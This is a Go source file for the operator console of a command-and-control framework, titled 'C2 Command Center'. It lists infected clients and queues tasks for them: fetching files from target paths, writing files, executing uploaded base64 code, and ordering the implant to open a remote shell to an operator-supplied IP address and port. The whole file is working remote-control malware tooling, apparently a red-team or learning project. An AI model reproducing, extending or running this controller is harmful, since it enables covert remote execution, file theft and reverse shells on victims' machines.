package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"

	"github.com/google/uuid"
	ishell "gopkg.in/abiosoft/ishell.v2"

	"github.com/bblenard/CommandAndControl/endpoints"
	"github.com/bblenard/CommandAndControl/types"
)

var ServerAddr string

func ExistingFileSource(c *ishell.Context) ([]byte, error) {
	c.Print("Source File Path: ")
	sfp := c.ReadLine()
	return ioutil.ReadFile(sfp)
}

func AdHocSource(c *ishell.Context) ([]byte, error) {
	c.Print("Press [ ENTER ] to launch vim to create file source")
	c.ReadLine()
	vimCommand := exec.Command("vim", ".adhoc_source")
	vimCommand.Stdin = os.Stdin
	vimCommand.Stderr = os.Stderr
	vimCommand.Stdout = os.Stdout
	err := vimCommand.Run()
	if err != nil {
		return []byte{}, err
	}
	bytes, err := ioutil.ReadFile(".adhoc_source")
	if err != nil {
		return bytes, err
	}
	os.Remove(".adhoc_source")
	return bytes, nil
}

func collectContentSource(c *ishell.Context) ([]byte, error) {
	choice := c.MultiChoice([]string{"Existing File", "Ad Hoc File"}, "Content Source:")
	switch choice {
	case 0:
		return ExistingFileSource(c)
	case 1:
		return AdHocSource(c)
	}
	return []byte{}, fmt.Errorf("invalid content source")
}

func NewGetTaskDetails(c *ishell.Context) (json.RawMessage, error) {
	c.Print("Target file's path: ")
	path := c.ReadLine()

	gtd := types.GetDetails{
		Type: "Get",
		Path: path,
	}

	mgtd, err := json.Marshal(gtd)
	if err != nil {
		c.Print(err.Error())
	}
	return mgtd, err
}

func NewPutTaskDetails(c *ishell.Context) (json.RawMessage, error) {
	var contents []byte
	var err error
	c.Print("Path for file: ")
	path := c.ReadLine()
	c.ClearScreen()
	contents, err = collectContentSource(c)
	if err != nil {
		return nil, err
	}
	content := base64.StdEncoding.EncodeToString(contents)
	ptd := types.PutDetails{
		Type:    "Put",
		Path:    path,
		Content: content,
	}
	return json.Marshal(ptd)
}

func NewExecTaskDetails(c *ishell.Context) (json.RawMessage, error) {
	var contents []byte
	var err error
	contents, err = collectContentSource(c)
	if err != nil {
		return nil, err
	}
	b64Contents := base64.StdEncoding.EncodeToString(contents)
	etd := types.ExecuteDetails{
		Type:  "Execute",
		Bin64: b64Contents,
	}

	return json.Marshal(etd)
}

func NewShellTaskDetails(c *ishell.Context) (json.RawMessage, error) {
	c.Print("IPv4 address to connect shell to: ")
	ipaddr := c.ReadLine()
	c.Print("Port to connect shell to: ")
	port := c.ReadLine()
	c.Print("Shell to use: ")
	shellPath := c.ReadLine()
	std := types.ShellSessionDetails{
		Addr: ipaddr,
		Port: port,
		Path: shellPath,
	}
	return json.Marshal(std)
}

func ManageClients(c *ishell.Context) {
	var clientList []types.Client
	clientListResp, err := http.Get(ServerAddr + endpoints.GETCLIENTS)
	if err != nil {
		c.Println(err)
		return
	}

	jd := json.NewDecoder(clientListResp.Body)
	err = jd.Decode(&clientList)
	if err != nil {
		c.Println(err.Error())
	}
	clients := []string{}
	for _, v := range clientList {
		clients = append(clients, v.ID)
	}
	if len(clients) == 0 {
		c.Println("No Clients are registered to server.")
		return
	}
	choice := c.MultiChoice(clients, "Clients: ")
	enterManagementFor(c, clientList[choice])
}

func enterManagementFor(c *ishell.Context, client types.Client) {
	for {
		c.Printf("Client Information:\n%v", client)
		choice := c.MultiChoice([]string{
			"Review Task Results",
			"Create New Task",
			"Delete Pending Task",
			"Back",
		}, "Management Options: ")
		switch choice {
		case 0:
			reviewTasksResultsForClient(c, client)
		case 1:
			createTaskForClient(c, client)
		case 2:
			deletePendingTaskForClient(c, client)
		case 3:
			return
		}
		c.ReadLine()
	}
}

func deletePendingTaskForClient(c *ishell.Context, client types.Client) {
	headers := http.Header{}
	headers.Add("CID", client.ID)
	resp, err := getDataFromServer(ServerAddr+endpoints.GETPENDINGTASKSBYCLIENT, headers)
	if err != nil {
		c.Println(err)
		return
	}
	responseDecoder := json.NewDecoder(resp.Body)
	pendingTasks := new([]types.Task)
	responseDecoder.Decode(pendingTasks)
	if len(*pendingTasks) == 0 {
		c.Println("Client has no pending tasks, exiting")
		return
	}
	pendingTasksMenuOptions := make([]string, len(*pendingTasks))
	for i, v := range *pendingTasks {
		pendingTasksMenuOptions[i] = fmt.Sprintf("ID: %s\n\tTitle: %s", v.ID, v.Title)
	}
	choice := c.MultiChoice(pendingTasksMenuOptions, "Select Pending task to delete: ")
	deleteTaskFromServer((*pendingTasks)[choice])
}

func reviewTasksResultsForClient(c *ishell.Context, client types.Client) {
	headers := http.Header{}
	headers.Add("CID", client.ID)
	resp, err := getDataFromServer(ServerAddr+endpoints.GETCOMPLETEDTASKSBYCLIENT, headers)
	if err != nil {
		c.Println(err)
		return
	}

	responseDecoder := json.NewDecoder(resp.Body)
	reports := new([]types.TaskReport)
	responseDecoder.Decode(reports)
	if len(*reports) == 0 {
		c.Println("Client has no completed tasks")
		return
	}
	reportSummaries := make([]string, len(*reports))
	for i, v := range *reports {
		reportSummaries[i] = fmt.Sprintf("ID: %s\n\tTitle: %s", v.ID, v.Title)
	}
	choice := c.MultiChoice(reportSummaries, "Task Reports: ")
	c.Printf("%v", (*reports)[choice])
}

func createTaskForClient(c *ishell.Context, client types.Client) {
	task := new(types.Task)
	var taskDetails json.RawMessage
	var err error
	taskTypes := []string{"Get", "Put", "Execute", "Shell"}
	choice := c.MultiChoice(taskTypes, "New Task Type:")
	switch choice {
	case 0:
		taskDetails, err = NewGetTaskDetails(c)
	case 1:
		taskDetails, err = NewPutTaskDetails(c)
	case 2:
		taskDetails, err = NewExecTaskDetails(c)
	case 3:
		taskDetails, err = NewShellTaskDetails(c)
	}
	targetID, err := uuid.Parse(client.ID)
	if err != nil {
		c.Printf("failed to create task for client: %s", err)
		return
	}
	task.Init(targetID, taskTypes[choice])
	if err != nil {
		c.Printf("failed to init task: %s", err)
		return
	}
	task.Details = taskDetails
	c.Print("Title for task: ")
	title := c.ReadLine()
	task.Title = title
	if err := pushTaskToServer(*task); err != nil {
		c.Printf("failed to push task to server: %s", err)
	}
}

func pushTaskToServer(task types.Task) error {
	resp, err := postDataToServer(ServerAddr+endpoints.SAVETASK, nil, task)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return fmt.Errorf(resp.Status)
	}
	return nil
}

func deleteTaskFromServer(task types.Task) error {
	headers := http.Header{}
	headers.Add("TID", task.ID)
	resp, err := postDataToServer(ServerAddr+endpoints.DELETETASK, headers, nil)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		responseDecoder := json.NewDecoder(resp.Body)
		var errorStr string
		responseDecoder.Decode(&errorStr)
		return fmt.Errorf("failed to delete task from server: %s", errorStr)
	}
	return nil
}

func postDataToServer(url string, headers http.Header, data interface{}) (*http.Response, error) {
	b := new(bytes.Buffer)
	if err := json.NewEncoder(b).Encode(data); err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", url, b)
	if err != nil {
		return nil, err
	}
	req.Header = headers
	return http.DefaultClient.Do(req)
}

func getDataFromServer(url string, headers http.Header) (*http.Response, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header = headers
	return http.DefaultClient.Do(req)
}

func main() {
	shell := ishell.New()
	ServerAddr = os.Getenv("SERVER_ADDR")
	if ServerAddr == "" {
		ServerAddr = "http://127.0.0.1:8888"
	}

	shell.Println("C2 Command Center")
	shell.AddCmd(&ishell.Cmd{
		Name: "Manage",
		Help: "Starts client management",
		Func: ManageClients,
	})
	shell.Run()
}
